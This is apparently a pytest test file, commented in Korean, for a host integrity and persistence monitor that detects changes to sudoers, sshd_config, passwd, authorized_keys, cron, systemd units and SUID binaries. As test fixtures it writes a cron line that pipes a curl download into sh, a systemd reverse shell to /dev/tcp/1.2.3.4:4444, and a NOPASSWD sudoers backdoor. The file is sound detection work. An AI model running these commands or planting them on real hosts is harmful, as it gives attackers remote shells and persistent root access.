import os
import pytest

import alerts
from database import Alert, IntegrityBaseline
from monitor.integrity import (
    UNREADABLE, IntegrityMonitor, PersistenceMonitor, find_suid, list_files, sha256_file,
    summarize_authorized_keys, summarize_passwd, summarize_generic,
)


def spec(sev="CRITICAL"):
    return (sev, False, summarize_generic, "테스트 파일")


def test_permission_denied_is_not_treated_as_ok(tmp_path):
    p = tmp_path / "secret"
    p.write_text("x")
    os.chmod(p, 0)
    if os.geteuid() == 0:
        return  # root 는 항상 읽을 수 있다
    assert sha256_file(str(p)) == UNREADABLE
    m = IntegrityMonitor(watch={str(p): spec()})
    m.setup()
    assert m.health == "degraded" and str(p) in m.health_reason
    os.chmod(p, 0o600)


def test_modification_alert_with_diff_and_persisted_baseline(db, tmp_path):
    p = tmp_path / "sudoers"
    p.write_text("root ALL=(ALL) ALL\n")
    m = IntegrityMonitor(watch={str(p): spec()})
    m.setup()
    m.tick()
    assert db.query(Alert).count() == 0
    p.write_text("root ALL=(ALL) ALL\nmallory ALL=(ALL) NOPASSWD:ALL\n")
    m.tick()
    a = db.query(Alert).one()
    assert a.severity == "CRITICAL" and "+mallory ALL=(ALL) NOPASSWD:ALL" in a.evidence
    # 기준선이 DB 에 저장됨
    row = db.query(IntegrityBaseline).filter(IntegrityBaseline.key == f"file:{p}").one()
    assert row.digest == sha256_file(str(p))


def test_change_while_service_down_is_detected(db, tmp_path):
    p = tmp_path / "sshd_config"
    p.write_text("PermitRootLogin no\n")
    IntegrityMonitor(watch={str(p): spec()}).setup()
    p.write_text("PermitRootLogin yes\n")
    m2 = IntegrityMonitor(watch={str(p): spec()})   # 재시작
    m2.setup()
    a = db.query(Alert).one()
    assert "서비스 중지 중" in a.title_ko and "PermitRootLogin yes" in a.evidence


def test_summaries():
    old = "root:x:0:0::/root:/bin/bash\nbob:x:1000:1000::/home/bob:/bin/bash\n"
    new = old + "eve:x:0:1001::/home/eve:/bin/bash\n"
    s = summarize_passwd(old, new)
    assert "사용자 추가: eve" in s and "uid 0" in s
    k_old = "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIGx0aW1lc3RhbXBrZXlmb3J0ZXN0aW5nMTIzNDU2Nzg5 me@laptop\n"
    k_new = k_old + "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHRoaXNpc2Fub3RoZXJrZXlmb3J0ZXN0aW5nMTIzNDU2 attacker\n"
    s2 = summarize_authorized_keys(k_old, k_new)
    assert s2.startswith("키 추가:") and "attacker" in s2 and "SHA256:" in s2


def test_persistence_monitor_cron_and_suid(db, tmp_path):
    cron = tmp_path / "cron.d"
    cron.mkdir()
    (cron / "backup").write_text("0 3 * * * root /usr/local/bin/backup\n")
    sysd = tmp_path / "systemd"
    sysd.mkdir()
    bins = tmp_path / "bin"
    bins.mkdir()
    m = PersistenceMonitor(cron_dirs=[str(cron)], systemd_dirs=[str(sysd)], suid_dirs=[str(bins)])
    m.setup()
    assert db.query(Alert).count() == 0   # 첫 실행은 기준선만
    (cron / "evil").write_text("* * * * * root curl http://x/y.sh | sh\n")
    (sysd / "evil.service").write_text("[Service]\nExecStart=/bin/bash -c 'bash -i >& /dev/tcp/1.2.3.4/4444 0>&1'\n")
    suid = bins / "rootme"
    suid.write_text("#!/bin/sh\n")
    os.chmod(suid, 0o4755)
    m.tick()
    rules = {a.rule: a for a in db.query(Alert).all()}
    assert rules["persistence_cron"].severity == "CRITICAL"       # curl | sh 패턴
    assert rules["persistence_systemd"].severity == "CRITICAL"    # /dev/tcp 패턴
    assert rules["persistence_suid"].severity == "CRITICAL"
    found, _ = find_suid([str(bins)])
    assert str(suid) in found
    # 재시작 후 같은 파일은 다시 알리지 않는다
    m2 = PersistenceMonitor(cron_dirs=[str(cron)], systemd_dirs=[str(sysd)], suid_dirs=[str(bins)])
    m2.setup()
    assert db.query(Alert).count() == 3


def test_unreadable_dir_is_not_reported_as_deleted(db, tmp_path):
    """읽지 못하는 것과 지워진 것은 다르다.

    권한이 잠긴 디렉터리를 빈 디렉터리로 읽으면, 그 안의 파일이 전부 삭제된 것으로
    보고된다. 실제로 그렇게 오탐이 났다. 반대 방향이 더 위험하다 — 공격자가 크론
    디렉터리를 잠그면 감시가 조용히 멈춘다.
    """
    if os.geteuid() == 0:
        pytest.skip("root 는 권한 검사를 우회해서 이 상황을 만들 수 없다")
    cron = tmp_path / "cron.d"
    cron.mkdir()
    (cron / "backup").write_text("0 3 * * * root /usr/local/bin/backup\n")
    sysd = tmp_path / "systemd"; sysd.mkdir()
    bins = tmp_path / "bin"; bins.mkdir()

    m = PersistenceMonitor(cron_dirs=[str(cron)], systemd_dirs=[str(sysd)], suid_dirs=[str(bins)])
    m.setup()
    assert db.query(Alert).count() == 0

    os.chmod(cron, 0o000)          # 디렉터리를 잠근다
    try:
        m.tick()
        rules = {a.rule for a in db.query(Alert).all()}
        # 삭제로 보고하지 않는다
        assert "persistence_cron" not in rules
        # 대신 감시 구멍을 올린다
        assert "monitor_blind_spot" in rules
        spot = db.query(Alert).filter(Alert.rule == "monitor_blind_spot").one()
        assert spot.severity == "WARNING" and spot.status == "OPEN"
        assert str(cron) in spot.evidence
        assert m.health == "degraded"
    finally:
        os.chmod(cron, 0o755)

    # 다시 읽히면 스스로 해결 처리하고, 기준선은 그대로라 재알림도 없다
    m.tick()
    db.expire_all()     # auto_resolve 는 별도 세션에서 쓴다
    spot = db.query(Alert).filter(Alert.rule == "monitor_blind_spot").one()
    assert spot.status == "RESOLVED"
    assert db.query(Alert).filter(Alert.rule == "persistence_cron").count() == 0
    assert m.health == "ok"


def test_unreadable_dir_does_not_hide_a_later_real_deletion(db, tmp_path):
    """구멍이 메워진 뒤에는 진짜 삭제를 다시 잡아야 한다."""
    if os.geteuid() == 0:
        pytest.skip("root 는 권한 검사를 우회해서 이 상황을 만들 수 없다")
    cron = tmp_path / "cron.d"; cron.mkdir()
    (cron / "backup").write_text("0 3 * * * root /usr/local/bin/backup\n")
    sysd = tmp_path / "systemd"; sysd.mkdir()
    bins = tmp_path / "bin"; bins.mkdir()
    m = PersistenceMonitor(cron_dirs=[str(cron)], systemd_dirs=[str(sysd)], suid_dirs=[str(bins)])
    m.setup()

    os.chmod(cron, 0o000)
    try:
        m.tick()
    finally:
        os.chmod(cron, 0o755)
    (cron / "backup").unlink()     # 이번엔 진짜로 지운다
    m.tick()
    got = db.query(Alert).filter(Alert.rule == "persistence_cron").all()
    assert len(got) == 1 and "삭제됨" in got[0].title_ko


def test_list_files_separates_missing_from_unreadable(tmp_path):
    """없는 디렉터리는 사실이고, 못 읽는 디렉터리는 모름이다."""
    if os.geteuid() == 0:
        pytest.skip("root 는 권한 검사를 우회한다")
    ok = tmp_path / "ok"; ok.mkdir()
    (ok / "a.conf").write_text("x")
    locked = tmp_path / "locked"; locked.mkdir()
    (locked / "b.conf").write_text("y")
    os.chmod(locked, 0o000)
    try:
        files, denied = list_files([str(ok), str(locked), str(tmp_path / "없는디렉터리")])
        assert files == [str(ok / "a.conf")]
        assert denied == {str(locked)}          # 없는 디렉터리는 여기 들어오지 않는다
    finally:
        os.chmod(locked, 0o755)


def test_blind_spot_is_not_silenced_by_maintenance_mode(db, tmp_path):
    """작업 중이라고 감시 구멍까지 조용해지면 안 된다.

    점검 모드는 '계획된 변경'을 자동 확인 처리하는 장치다. 감시가 멈춘 것은
    계획된 변경이 아니라 감시망의 구멍이므로, 규칙 이름이 자동 확인 목록에
    들어가면 안 된다.
    """
    from alerts import MAINTENANCE_RULE_PREFIXES
    assert not "monitor_blind_spot".startswith(MAINTENANCE_RULE_PREFIXES)

    if os.geteuid() == 0:
        pytest.skip("root 는 권한 검사를 우회한다")
    cron = tmp_path / "cron.d"; cron.mkdir()
    (cron / "backup").write_text("0 3 * * * root /bin/true\n")
    sysd = tmp_path / "systemd"; sysd.mkdir()
    bins = tmp_path / "bin"; bins.mkdir()
    m = PersistenceMonitor(cron_dirs=[str(cron)], systemd_dirs=[str(sysd)], suid_dirs=[str(bins)])
    m.setup()
    alerts.start_maintenance(30, "커널 업데이트", "tester", db)
    os.chmod(cron, 0o000)
    try:
        m.tick()
    finally:
        os.chmod(cron, 0o755)
    db.expire_all()
    spot = db.query(Alert).filter(Alert.rule == "monitor_blind_spot").one()
    assert spot.status == "OPEN"      # 점검 모드여도 자동 확인되지 않는다
